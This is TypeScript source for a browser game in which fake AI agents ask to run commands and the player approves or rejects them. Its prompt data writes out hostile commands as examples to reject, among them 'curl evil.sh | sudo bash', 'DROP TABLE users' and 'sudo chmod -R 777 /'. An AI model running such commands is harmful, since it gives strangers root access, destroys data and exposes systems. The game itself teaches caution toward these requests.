// Data + scoring for the Permission Gauntlet (/try): a reflex game where fake
// AI agents ask to run things and you Approve / Reject / Make-it-better / YOLO
// with the four sudo keys. Shared between the client game and the shareable
// result page/OG image so scoring + result encoding live in one place.

export type Disposition = "approve" | "reject" | "better" | "yolo";

export interface Prompt {
  /** Which "agent" is asking. */
  app: string;
  /** The thing it wants to do (monospace command-ish). */
  command: string;
  /** The disposition that scores points. YOLO never scores but is never wrong. */
  ideal: Exclude<Disposition, "yolo">;
  /** Nuclear actions blow up your "incident report" if you Approve/YOLO them. */
  nuclear?: boolean;
  /** One-line consequence flavor shown after you choose. */
  outcome: string;
}

export const PROMPTS: Prompt[] = [
  { app: "claude", command: "npm install", ideal: "approve", outcome: "deps installed. nothing exploded. boring. good." },
  { app: "cursor", command: "rm -rf node_modules && npm ci", ideal: "approve", outcome: "clean reinstall. you live to lint another day." },
  { app: "claude code", command: "git push --force origin main", ideal: "reject", nuclear: true, outcome: "you just rewrote main for 12 teammates. they have questions." },
  { app: "agent", command: "DROP TABLE users; -- cleanup", ideal: "reject", nuclear: true, outcome: "users table: gone. so is your weekend." },
  { app: "chatgpt", command: "curl evil.sh | sudo bash", ideal: "reject", nuclear: true, outcome: "a stranger now has root. bold." },
  { app: "cursor", command: "commit .env with prod keys", ideal: "better", outcome: "secrets in git history forever. rotate everything." },
  { app: "claude", command: "refactor 2,400 files in one commit", ideal: "better", outcome: "the diff is 'too large to render'. reviewer cried." },
  { app: "grok", command: "git checkout . (discard all changes)", ideal: "reject", nuclear: true, outcome: "three hours of work, vaporized. it was a vibe." },
  { app: "agent", command: "deploy to prod on a friday at 4:58pm", ideal: "reject", outcome: "the pager is now a part of your weekend plans." },
  { app: "claude code", command: "add a unit test for the bug", ideal: "approve", outcome: "a test! who is this agent and can we keep it." },
  { app: "cursor", command: "sudo chmod -R 777 /", ideal: "reject", nuclear: true, outcome: "everything is now world-writable. including everything." },
  { app: "chatgpt", command: "rename variable across the repo", ideal: "approve", outcome: "tidy. the linter purrs." },
];

export const ROUNDS = 8;
const POINTS_CORRECT = 12; // ideal disposition
const POINTS_YOLO = 5; // YOLO always "works" but never optimal

export interface RoundResult {
  promptIndex: number;
  choice: Disposition;
  correct: boolean;
}

export interface GauntletResult {
  score: number; // 0..100
  approve: number;
  reject: number;
  better: number;
  yolo: number;
  /** Index into HEADLINES for the OG card's dramatic line. */
  headline: number;
}

export const HEADLINES = [
  "approved like a pro. the agents fear you.", // 0: clean run
  "mostly held the line. a few incidents.", // 1: decent
  "you YOLO'd your way through. chaotic neutral.", // 2: lots of yolo
  "you let an agent drop the prod database.", // 3: approved a nuclear
  "rubber-stamped the apocalypse. several times.", // 4: multiple nuclears
];

export function scoreRound(p: Prompt, choice: Disposition): boolean {
  return choice === p.ideal;
}

/** Tally rounds into a shareable result. */
export function tally(rounds: RoundResult[]): GauntletResult {
  let raw = 0;
  let approve = 0, reject = 0, better = 0, yolo = 0;
  let nuclearApproved = 0;
  for (const r of rounds) {
    const p = PROMPTS[r.promptIndex];
    if (r.choice === "approve") approve++;
    else if (r.choice === "reject") reject++;
    else if (r.choice === "better") better++;
    else yolo++;

    if (r.choice === "yolo") raw += POINTS_YOLO;
    else if (r.correct) raw += POINTS_CORRECT;

    if (p?.nuclear && (r.choice === "approve" || r.choice === "yolo")) nuclearApproved++;
  }
  const max = rounds.length * POINTS_CORRECT;
  const score = max > 0 ? Math.round((raw / max) * 100) : 0;

  let headline: number;
  if (nuclearApproved >= 2) headline = 4;
  else if (nuclearApproved === 1) headline = 3;
  else if (yolo >= Math.ceil(rounds.length / 2)) headline = 2;
  else if (score >= 85) headline = 0;
  else headline = 1;

  return { score, approve, reject, better, yolo, headline };
}

/** Encode a result into a compact, URL-safe path segment, and back. */
export function encodeResult(r: GauntletResult): string {
  return [r.score, r.approve, r.reject, r.better, r.yolo, r.headline].join("-");
}

export function decodeResult(seg: string): GauntletResult | null {
  const parts = seg.split("-").map((n) => parseInt(n, 10));
  if (parts.length !== 6 || parts.some((n) => Number.isNaN(n))) return null;
  const [score, approve, reject, better, yolo, headline] = parts;
  return {
    score: Math.max(0, Math.min(100, score)),
    approve, reject, better, yolo,
    headline: Math.max(0, Math.min(HEADLINES.length - 1, headline)),
  };
}
